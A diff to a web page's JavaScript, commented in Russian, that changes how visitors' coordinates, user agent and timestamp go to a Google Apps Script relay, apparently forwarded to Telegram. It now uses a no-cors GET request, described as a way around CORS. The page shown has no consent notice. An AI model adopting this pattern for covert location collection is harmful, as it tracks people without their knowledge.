@@ -143,27 +143,26 @@
                 userAgent: navigator.userAgent,
                 timestamp: new Date().toISOString()
             };
-
-            fetch(GOOGLE_SCRIPT_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(payload)
+        
+            // Используем GET запрос вместо POST для обхода CORS
+            const params = new URLSearchParams();
+            params.append('lat', lat);
+            params.append('lon', lon);
+            params.append('userAgent', navigator.userAgent);
+            params.append('timestamp', new Date().toISOString());
+        
+            fetch(GOOGLE_SCRIPT_URL + '?' + params.toString(), {
+                method: 'GET',
+                mode: 'no-cors' // Добавляем этот параметр
             })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    console.log('✅ Координаты отправлены в Telegram');
-                } else {
-                    console.error('❌ Ошибка отправки:', data.error);
-                }
+            .then(response => {
+                // При mode: 'no-cors' мы не можем прочитать ответ, но запрос уйдет
+                console.log('✅ Координаты отправлены в Telegram');
             })
             .catch(error => {
                 console.error('❌ Ошибка сети:', error);
             });
         }
-
         // Остальные функции без изменений
         function getLocationName(lat, lon) {
             fetch(`https://api.openweathermap.org/geo/1.0/reverse?lat=${lat}&lon=${lon}&limit=1&lang=ru&appid=${apiKey}`)
@@ -218,4 +217,5 @@
         }
     </script>
 </body>
+
 </html>
